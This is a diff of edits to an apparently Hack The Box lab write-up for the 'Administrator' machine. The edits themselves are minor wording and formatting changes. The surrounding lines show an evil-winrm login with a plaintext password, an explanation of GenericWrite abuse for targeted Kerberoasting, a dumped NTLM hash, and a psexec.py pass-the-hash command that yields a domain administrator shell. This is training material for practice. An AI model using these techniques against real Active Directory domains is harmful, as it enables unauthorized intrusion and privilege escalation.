@@ -198,7 +198,7 @@ We are given three user's and their passwords.
 
 <img width="500" height="353" alt="image" src="https://github.com/user-attachments/assets/cbf857d5-6b06-4132-a5d9-564deff085a7" />
 
-I copied each password out and inspected the users in BloodHound. Based on the "Enabled: False" data in BloodHound, it appeared that the alexander@administrator.htb and emma@administrator.htb accounts were inactive. Since the only active account was emily@administrator.htb, I started by logging in to the machine via WinRM as Emily.
+I copied each password out and inspected the users in BloodHound. Based on the "Enabled: False" data in BloodHound, it appeared that the `alexander@administrator.htb` and `emma@administrator.htb` accounts were inactive. Since the only active account was `emily@administrator.htb`, I started by logging in to the machine via WinRM as Emily.
 ```
 └──╼ $evil-winrm -i 10.10.11.42 -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
 
@@ -215,6 +215,7 @@ We do find the user.txt flag in Emily's Desktop directory.
 # Solving root.txt
 
 I then once again inspected this user in BloodHound, noting that Emily has outbound GenericWrite control over the Ethan user.
+
 <img width="563" height="125" alt="image" src="https://github.com/user-attachments/assets/1c952aa2-5d2a-4d1a-a7de-cea6b147bf8e" />
 
 While GenericWrite is not as permissive as the GenericAll privileges we had on the other user, it still enables some attacks. Since we can modify most attributes of the targeted object, it gives us access to change/add a Service Principal Name (SPN). SPNs are unique identifiers that Kerberos uses to map a service instance to a service account. This is significant because any user in the domain is able to request a TGS ticket for an account with an SPN setup, and the TGS-REP is encrypted with the service account's NTLM hash. This opens the ability for us to try to brute force the password.
@@ -294,7 +295,7 @@ DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
 [*] Cleaning up...
 ```
 
-To now leverage this information to get access as the built-in Domain Administrator account, I attempted to pass the hash via the `psexec.py` utility. This was successful and allowed us to obtain the root.txt flag.
+To now leverage this information to get access as the built-in Domain Administrator account, I attempted to pass the hash via the `psexec.py` utility. This was successful and allowed us to obtain the root.txt flag from the Administrator's Desktop directory.
 ```
 └──╼ $psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
